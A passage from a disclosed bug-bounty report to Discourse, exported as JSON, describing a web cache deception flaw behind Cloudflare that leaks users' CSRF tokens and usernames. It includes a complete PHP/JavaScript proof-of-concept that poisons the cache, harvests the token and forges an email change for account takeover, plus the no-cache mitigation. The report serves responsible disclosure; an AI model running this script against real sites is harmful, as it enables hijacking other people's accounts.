            "markdown_message": "<p>Thank you!<br>\nI haven&#39;t confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.</p>\n\n<p>Great job, glad that it could get solved, sorry for the long delay of getting a proper PoC.</p>\n", 
            "type": "Activities::BugNew", 
            "id": 2343837, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "created_at": "2018-02-02T06:11:25.477Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-02T06:11:25.477Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 2343918, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-09T18:00:09.615Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-09T18:00:09.615Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3019401, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-08T18:00:12.277Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-08T18:00:12.277Z", 
            "actor": {
                "url": "/discourse", 
                "profile": {
                    "name": "Discourse"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
                }
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3162622, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "fransrosen", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/fransrosen", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/634/6e02242b5d1d893cef698144faa706fd1d75fea0_small.jpg?1396468576"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -10383482.88107272, 
    "disclosed_at": "2018-08-08T18:00:12.220Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/260697", 
    "created_at": "2017-08-16T13:06:55.522Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>I noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting <code>try.discourse.org</code> but the same underlying issue can be seen there as well even though it&#39;s not exploitable on that specific domain.</p>\n\n<p>The TL;DR of issue is basically: <code>Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens</code>.</p>\n\n<p>As you might understand due to this, the PoC below is not working on <code>try.discourse.org</code>. I haven&#39;t provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.</p>\n\n<h3 id=\"background\">Background</h3>\n\n<p>You might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. </p>\n\n<p>Any URL having a file ending with one of <a href=\"/redirect?signature=b452155f212286d71466dd6681f545df175f2856&amp;url=https%3A%2F%2Fsupport.cloudflare.com%2Fhc%2Fen-us%2Farticles%2F200172516-Which-file-extensions-does-Cloudflare-cache-for-static-content-\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CloudFlare&#39;s mime types</span><i class=\"icon-external-link\"></i></a> will be cached for the whole region. Remember, a region is <strong>big</strong> and there are only 13 of them in total (in my case, the region is Western Europe). Here&#39;s a reference from <a href=\"/redirect?signature=0ac1820699f1407776cdf56e6b08ed25c9b97186&amp;url=https%3A%2F%2Fsupport.cloudflare.com%2Fhc%2Fen-us%2Farticles%2F115000540888-Load-Balancing-Geographic-Regions\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CloudFlare about their regions</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>This attack vector was coined by <strong>Omer Gil</strong> earlier this year ( <a title=\"https://www.slideshare.net/OmerGil/web-cache-deception-attack\" href=\"/redirect?signature=163b3b033506ad078403c692611753115e85536b&amp;url=https%3A%2F%2Fwww.slideshare.net%2FOmerGil%2Fweb-cache-deception-attack\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.slideshare.net/OmerGil/web-cache-deception-attack</span><i class=\"icon-external-link\"></i></a> ).</p>\n\n<h3 id=\"technical-details\">Technical details</h3>\n\n<p>The issue with Discourse is that there&#39;s a lot of routes which all of them exposes the user&#39;s CSRF-token as well as the user&#39;s username in the header. This applies not only to status <code>200</code> but also to status <code>404</code>.</p>\n\n<p>Here are some routes which will return status <code>200</code> on <code>try.discourse.org</code> even if we have appended <code>.css</code> on them (which is a trigger for CloudFlare to cache this URL):</p>\n<pre class=\"highlight plaintext\"><code>/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n</code></pre>\n<p>Results in:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/preferences\n\nHTTP/1.1 200 OK\nX-Discourse-Route: users/card_badge\n</code></pre>\n<p>(This seems to be a general issue with the <code>X-Discourse-Route: users/*</code> routes)</p>\n\n<p>Also, the normal 404-page actually reveals the current user&#39;s CSRF token (this request is done while being signed in):</p>\n<pre class=\"highlight plaintext\"><code>GET /u/x.css HTTP/1.1\nHost: try.discourse.org\n\n&lt;meta name=&quot;csrf-token&quot; content=&quot;aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==&quot; /&gt;\n</code></pre>\n<p>You currently don&#39;t have <code>try.discourse.org</code> behind CloudFlare, but I&#39;ve verified with a few instances that I noticed did.</p>\n\n<p>What you will see is the following:</p>\n\n<p>Issuing the following request twice while being signed in:</p>\n<pre class=\"highlight plaintext\"><code>GET /u/x.css HTTP/1.1\n</code></pre>\n<p>Will lead to:</p>\n<pre class=\"highlight plaintext\"><code>CF-Cache-Status: HIT\n</code></pre>\n<p>As well as:</p>\n<pre class=\"highlight plaintext\"><code>X-Discourse-Username: test\n\n&lt;meta name=&quot;csrf-token&quot; content=&quot;6bE...VnlQ==&quot; /&gt;\n</code></pre>\n<p>Same thing with <code>/u/my/preferences.css</code>.</p>\n\n<p>The issue is that none of these routes, exposing the CSRF-token and the username, has any <code>Pragma</code>, <code>Cache-Control</code> or <code>Expire</code>-headers, so there&#39;s nothing that tells CloudFlare not to cache these URLs.</p>\n\n<h3 id=\"poc\">PoC</h3>\n\n<p>You need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-08-16_at_14.07.00.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=0ce02a7b5411c9e264f86566afbc0d5fdee13324d59500353fda7e1532d14295\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/213/373/497fa800c168379e2b4afa85cc365d59676b36e2/Screen_Shot_2017-08-16_at_14.07.00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=0ce02a7b5411c9e264f86566afbc0d5fdee13324d59500353fda7e1532d14295\" class=\"markdown-inline-image\"></a></p>\n\n<p>Now, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there&#39;s only 13 regions in total.</p>\n\n<p>What this script will do is this:</p>\n\n<ol>\n<li>Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy</li>\n<li>Victim vists a malicious page by the attacker</li>\n<li>The page will issue three requests using <code>img</code>-tags to <code>/u/$rand.css</code>, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token</li>\n<li>After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).</li>\n<li>The script will extract the username from the <code>X-Discourse-Username</code> header and the CSRF-token from the HTML</li>\n<li>\n<p>The PHP-script will return these two values to the malicious site, and a form will be crafted:</p>\n<pre class=\"highlight plaintext\"><code>POST /users/$username/preferences/email.json HTTP/1.1\n\u00a0\n_method=PUT&amp;email=$attacker_email&amp;authenticity_token=$csrf_token\n</code></pre>\n</li>\n<li><p>Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.</p></li>\n</ol>\n\n<p>Here&#39;s the script. It seems like <code>_forum_session</code>-token has <code>SameSite=lax</code> which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?</span>\n<span class=\"nv\">$discourse</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;https://discourse.instance.behind.cloudflare.proxy&quot;</span><span class=\"p\">;</span> <span class=\"c1\">//like https://try.discourse.org but behind CloudFlare\n</span><span class=\"nv\">$email_to_change_to</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;changetothis@example.com&quot;</span><span class=\"p\">;</span>\n\n<span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"k\">empty</span><span class=\"p\">(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">&#39;fetch&#39;</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$f</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"o\">@</span><span class=\"nb\">intval</span><span class=\"p\">](</span><span class=\"o\">/</span><span class=\"nb\">intval</span><span class=\"p\">)(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">&#39;f&#39;</span><span class=\"p\">]);</span>\n    <span class=\"nv\">$ctx</span> <span class=\"o\">=</span> <span class=\"nb\">stream_context_create</span><span class=\"p\">(</span><span class=\"k\">array</span><span class=\"p\">(</span><span class=\"s1\">&#39;http&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"k\">array</span><span class=\"p\">(</span><span class=\"s1\">&#39;ignore_errors&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"kc\">true</span><span class=\"p\">)));</span>\n    <span class=\"nv\">$data</span> <span class=\"o\">=</span> <span class=\"nb\">file_get_contents</span><span class=\"p\">(</span><span class=\"nv\">$discourse</span><span class=\"o\">.</span><span class=\"s1\">&#39;/u/&#39;</span><span class=\"o\">.</span><span class=\"nv\">$f</span><span class=\"o\">.</span><span class=\"s1\">&#39;.css&#39;</span><span class=\"p\">,</span> <span class=\"kc\">false</span><span class=\"p\">,</span> <span class=\"nv\">$ctx</span><span class=\"p\">);</span>\n    <span class=\"nb\">preg_match</span><span class=\"p\">(</span><span class=\"s1\">&#39;/name=&quot;csrf-token&quot; content=&quot;([a-zA-Z0-9\\/=+]+)&quot;/&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$data</span><span class=\"p\">,</span> <span class=\"nv\">$matches</span><span class=\"p\">);</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"k\">empty</span><span class=\"p\">(</span><span class=\"nv\">$matches</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n        <span class=\"nb\">preg_match</span><span class=\"p\">(</span><span class=\"s1\">&#39;/X-Discourse-Username: (.*)/&#39;</span><span class=\"p\">,</span> <span class=\"nb\">implode</span><span class=\"p\">(</span><span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">,</span> <span class=\"nv\">$http_response_header</span><span class=\"p\">),</span> <span class=\"nv\">$name_matches</span><span class=\"p\">);</span>\n        <span class=\"k\">echo</span> <span class=\"nv\">$matches</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"s1\">&#39;;&#39;</span><span class=\"o\">.</span><span class=\"nv\">$name_matches</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n        <span class=\"k\">echo</span> <span class=\"s1\">&#39;error&#39;</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">exit</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"c1\">#random file to taint with csrf-token\n</span><span class=\"nv\">$rand</span> <span class=\"o\">=</span> <span class=\"nb\">mt_rand</span><span class=\"p\">(</span><span class=\"mi\">100000</span><span class=\"p\">,</span><span class=\"mi\">999999</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"s\">/u/</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$rand</span><span class=\"cp\">?&gt;</span><span class=\"s\">.css&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"s\">/u/</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$rand</span><span class=\"cp\">?&gt;</span><span class=\"s\">.css&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"s\">/u/</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$rand</span><span class=\"cp\">?&gt;</span><span class=\"s\">.css&quot;</span> <span class=\"na\">onerror=</span><span class=\"s\">&quot;f()&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"err\">\nvar user = &#39;&#39;, change_email_to = &#39;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$email_to_change_to</span><span class=\"cp\">?&gt;</span><span class=\"err\">&#39;;\nfunction f() {\n    fetch(&#39;?fetch=1&amp;f=</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$rand</span><span class=\"cp\">?&gt;</span><span class=\"err\">&#39;).then(function(e){return e.text()}).then(function(e){\n        if(e == &#39;error&#39;) { alert(&#39;You are currently running the PHP on a different Cloudflare region&#39;); return; }\n        user = e.split(&#39;;&#39;)[1];\n        document.getElementById(&#39;f&#39;).action = &#39;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"err\">/users/&#39;+user+&#39;/preferences/email&#39;\n        submitRequest(e.split(&#39;;&#39;)[0])\n    })\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n    if(xhr.readyState == 4) {\n        alert(&#39;Account email for &#39; + user + &#39; has been changed to: &#39; + change_email_to);\n    }\n  };\n  xhr.open(&quot;POST&quot;, &quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"o\">/</span><span class=\"nx\">users</span><span class=\"o\">/</span><span class=\"s2\">&quot;+user+&quot;</span><span class=\"o\">/</span><span class=\"nx\">preferences</span><span class=\"o\">/</span><span class=\"nx\">email</span><span class=\"p\">.</span><span class=\"nx\">json</span><span class=\"s2\">&quot;, true);\n  xhr.setRequestHeader(&quot;</span><span class=\"nx\">Accept</span><span class=\"s2\">&quot;, &quot;</span><span class=\"nx\">text</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"nx\">html</span><span class=\"s2\">&quot;);\n  xhr.setRequestHeader(&quot;</span><span class=\"nx\">Content</span><span class=\"o\">-</span><span class=\"nx\">Type</span><span class=\"s2\">&quot;, &quot;</span><span class=\"nx\">application</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"nx\">x</span><span class=\"o\">-</span><span class=\"nx\">www</span><span class=\"o\">-</span><span class=\"nx\">form</span><span class=\"o\">-</span><span class=\"nx\">urlencoded</span><span class=\"s2\">&quot;);\n  xhr.withCredentials = true;\n  var body = &quot;</span><span class=\"nx\">_method</span><span class=\"o\">=</span><span class=\"nx\">PUT</span><span class=\"o\">&amp;</span><span class=\"nx\">email</span><span class=\"o\">=</span><span class=\"s2\">&quot; + encodeURIComponent(change_email_to) +&quot;</span><span class=\"o\">&amp;</span><span class=\"nx\">authenticity_token</span><span class=\"o\">=</span><span class=\"err\">&quot;</span> <span class=\"o\">+</span> <span class=\"nb\">encodeURIComponent</span><span class=\"p\">(</span><span class=\"nx\">csrf</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">aBody</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Uint8Array</span><span class=\"p\">(</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">aBody</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"nx\">aBody</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">charCodeAt</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span> \n  <span class=\"nx\">xhr</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nx\">Blob</span><span class=\"p\">([</span><span class=\"nx\">aBody</span><span class=\"p\">]));</span>\n<span class=\"p\">}</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;f&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;&amp;#95;method&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;PUT&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;email&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$email_to_change_to</span><span class=\"cp\">?&gt;</span><span class=\"s\">&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;authenticity&amp;#95;token&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;csrf&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;submit&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;display: none;&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Submit request&quot;</span> <span class=\"nt\">/&gt;</span>\n      Please wait...\n    <span class=\"nt\">&lt;/form&gt;</span>\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>If you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-08-16_at_14.56.30.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3712e636bedb480841dff7a58bdb5d26a23185a5f991088cd5434bf939fc614f\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3712e636bedb480841dff7a58bdb5d26a23185a5f991088cd5434bf939fc614f\" class=\"markdown-inline-image\"></a></p>\n\n<h3 id=\"mitigations\">Mitigations</h3>\n\n<p>Add the <code>no-cache</code> headers, <code>Cache-Control</code> and/or <code>Expire</code> on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the <code>X-Discourse-Username</code> is returned.</p>\n\n<p>Let me know if you need any additional information.</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
    "severity_rating": "low", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://discourse.org", 
            "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse", 
            "twitter_handle": "discourse", 
            "name": "Discourse"
        }, 
        "handle": "discourse", 
        "url": "https://hackerone.com/discourse", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/016/893/3dd37e1cfa3d9380ced573b87beae0c950703ddd_small.?1481849067", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 16893, 
        "default_currency": "usd"
    }, 
    "is_published": false
}